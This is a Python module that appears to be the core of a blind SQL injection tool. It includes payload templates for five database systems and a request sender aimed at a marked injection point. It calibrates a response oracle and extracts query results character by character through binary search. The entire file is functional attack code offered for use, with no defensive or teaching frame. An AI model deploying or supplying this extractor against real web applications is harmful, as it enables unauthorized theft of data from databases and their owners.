"""Extraction engine: payload building, response oracle and binary search."""

from __future__ import annotations

import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from typing import Callable

import requests

# How to measure a string and read one character, per DBMS.
DBMS = {
    "mysql": {"length": "LENGTH(({q}))", "char": "ASCII(SUBSTRING(({q}),{pos},1))"},
    "postgres": {"length": "LENGTH(({q}))", "char": "ASCII(SUBSTRING(({q}),{pos},1))"},
    "mssql": {"length": "LEN(({q}))", "char": "ASCII(SUBSTRING(({q}),{pos},1))"},
    "oracle": {"length": "LENGTH(({q}))", "char": "ASCII(SUBSTR(({q}),{pos},1))"},
    "sqlite": {"length": "LENGTH(({q}))", "char": "UNICODE(SUBSTR(({q}),{pos},1))"},
}

# Payload templates for a single-quoted string context. {cond} is the yes/no
# question, {delay} the sleep in seconds. Use --template for other contexts.
TEMPLATES = {
    "boolean": {
        "default": "' AND ({cond})-- -",
    },
    "error": {
        "mysql": "' AND (SELECT IF(({cond}),(SELECT 1 UNION SELECT 2),1))-- -",
        # 1/(SELECT 0) stops the planner from folding the error into every query.
        "postgres": "' AND 1=(SELECT CASE WHEN ({cond}) THEN 1/(SELECT 0) ELSE 1 END)-- -",
        "mssql": "' AND 1=(SELECT CASE WHEN ({cond}) THEN 1/0 ELSE 1 END)-- -",
        "oracle": "'||(SELECT CASE WHEN ({cond}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
        "sqlite": "' AND (SELECT CASE WHEN ({cond}) THEN load_extension(1) ELSE 1 END)-- -",
    },
    "time": {
        "mysql": "' AND IF(({cond}),SLEEP({delay}),0)-- -",
        "postgres": "'; SELECT CASE WHEN ({cond}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END-- -",
        "mssql": "'; IF ({cond}) WAITFOR DELAY '0:0:{delay}'-- -",
        "oracle": "'||(SELECT CASE WHEN ({cond}) THEN dbms_pipe.receive_message('a',{delay}) ELSE NULL END FROM dual)||'",
    },
}


class CalibrationError(Exception):
    """Raised when TRUE and FALSE responses can't be told apart."""


def default_template(technique: str, dbms: str) -> str:
    options = TEMPLATES[technique]
    template = options.get(dbms) or options.get("default")
    if template is None:
        raise ValueError(f"no built-in {technique} payload for {dbms}; pass --template")
    return template


@dataclass
class Target:
    """An HTTP request with one injection point marked by `marker`."""

    url: str
    method: str = "GET"
    data: str | None = None
    headers: dict[str, str] = field(default_factory=dict)
    marker: str = "*"
    timeout: float = 10.0
    proxy: str | None = None

    def __post_init__(self) -> None:
        spots = [self.url, self.data or "", *self.headers.values()]
        count = sum(s.count(self.marker) for s in spots)
        if count != 1:
            raise ValueError(
                f"mark exactly one injection point with '{self.marker}' "
                f"(found {count}) in the URL, body, cookie or a header"
            )
        self._session = requests.Session()
        if self.proxy:
            self._session.proxies = {"http": self.proxy, "https": self.proxy}
            self._session.verify = False

    def send(self, payload: str) -> requests.Response:
        # URL and body need URL-encoding; headers only need ';' escaped so a
        # stacked query doesn't split the Cookie header.
        encoded = urllib.parse.quote(payload, safe="")
        url = self.url.replace(self.marker, encoded)
        data = self.data.replace(self.marker, encoded) if self.data else None
        headers = {
            k: v.replace(self.marker, payload.replace(";", "%3B"))
            for k, v in self.headers.items()
        }
        return self._session.request(
            self.method, url, data=data, headers=headers,
            timeout=self.timeout, allow_redirects=False,
        )


class Oracle:
    """Answers yes/no conditions by sending payloads and reading the response."""

    def __init__(
        self,
        target: Target,
        template: str,
        technique: str,
        delay: int = 5,
        true_string: str | None = None,
        true_code: int | None = None,
    ) -> None:
        self.target = target
        self.template = template
        self.technique = technique
        self.delay = delay
        self.true_string = true_string
        self.true_code = true_code
        self.requests = 0
        self.rule = ""  # human-readable description of how TRUE is detected
        self._is_true: Callable[[requests.Response, float], bool] | None = None

    def _probe(self, cond: str) -> tuple[requests.Response, float]:
        payload = self.template.format(cond=cond, delay=self.delay)
        start = time.monotonic()
        resp = self.target.send(payload)
        self.requests += 1
        return resp, time.monotonic() - start

    def calibrate(self) -> str:
        """Send known TRUE/FALSE conditions and pick a rule that separates them."""
        if self.technique == "time":
            _, fast = self._probe("1=2")
            _, slow = self._probe("1=1")
            if slow - fast < self.delay * 0.8:
                raise CalibrationError(
                    f"TRUE took {slow:.1f}s and FALSE {fast:.1f}s; no {self.delay}s delay seen"
                )
            threshold = fast + self.delay / 2
            self._is_true = lambda r, t: t > threshold
            self.rule = f"response time > {threshold:.1f}s"
            return self.rule

        t1, _ = self._probe("1=1")
        f1, _ = self._probe("1=2")
        t2, _ = self._probe("2=2")
        f2, _ = self._probe("2=3")

        if self.true_string:
            s = self.true_string
            self._is_true = lambda r, t: s in r.text
            self.rule = f"body contains {s!r}"
        elif self.true_code is not None:
            c = self.true_code
            self._is_true = lambda r, t: r.status_code == c
            self.rule = f"status == {c}"
        elif t1.status_code == t2.status_code != f1.status_code == f2.status_code:
            c = t1.status_code
            self._is_true = lambda r, t: r.status_code == c
            self.rule = f"status == {c} (FALSE gives {f1.status_code})"
        elif len(t1.content) == len(t2.content) != len(f1.content) == len(f2.content):
            n = len(t1.content)
            self._is_true = lambda r, t: len(r.content) == n
            self.rule = f"body length == {n} (FALSE gives {len(f1.content)})"
        else:
            raise CalibrationError(
                "TRUE and FALSE responses look the same or are unstable; "
                "pass --string or --code"
            )

        if not (self.ask_response(t1) and self.ask_response(t2)) or (
            self.ask_response(f1) or self.ask_response(f2)
        ):
            raise CalibrationError(f"rule '{self.rule}' doesn't separate TRUE from FALSE")
        return self.rule

    def ask_response(self, resp: requests.Response, elapsed: float = 0.0) -> bool:
        assert self._is_true is not None, "call calibrate() first"
        return self._is_true(resp, elapsed)

    def ask(self, cond: str) -> bool:
        resp, elapsed = self._probe(cond)
        return self.ask_response(resp, elapsed)


def binary_search(ask: Callable[[str], bool], expr: str, lo: int, hi: int) -> int:
    """Find the integer value of `expr` in [lo, hi] with ~log2(hi-lo) questions."""
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(f"{expr}>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


class Extractor:
    def __init__(self, oracle: Oracle, dbms: str, threads: int = 4, max_length: int = 4096):
        self.oracle = oracle
        self.fns = DBMS[dbms]
        self.threads = threads
        self.max_length = max_length

    def length(self, query: str) -> int:
        expr = self.fns["length"].format(q=query)
        hi = 16
        while self.oracle.ask(f"{expr}>{hi}"):
            if hi >= self.max_length:
                raise ValueError(f"result is longer than {self.max_length} characters")
            hi *= 2
        return binary_search(self.oracle.ask, expr, 0, hi)

    def char(self, query: str, pos: int) -> str:
        expr = self.fns["char"].format(q=query, pos=pos)
        code = binary_search(self.oracle.ask, expr, 0, 127)
        return chr(code) if 32 <= code < 127 else "?"

    def extract(
        self, query: str, on_char: Callable[[int, str], None] | None = None
    ) -> str:
        n = self.length(query)
        result = ["_"] * n

        def work(pos: int) -> None:
            c = self.char(query, pos)
            result[pos - 1] = c
            if on_char:
                on_char(pos, "".join(result))

        # Characters are independent, so they can be fetched in parallel.
        # Time-based checks stay sequential so delays don't overlap.
        workers = 1 if self.oracle.technique == "time" else self.threads
        with ThreadPoolExecutor(max_workers=workers) as pool:
            list(pool.map(work, range(1, n + 1)))
        return "".join(result)
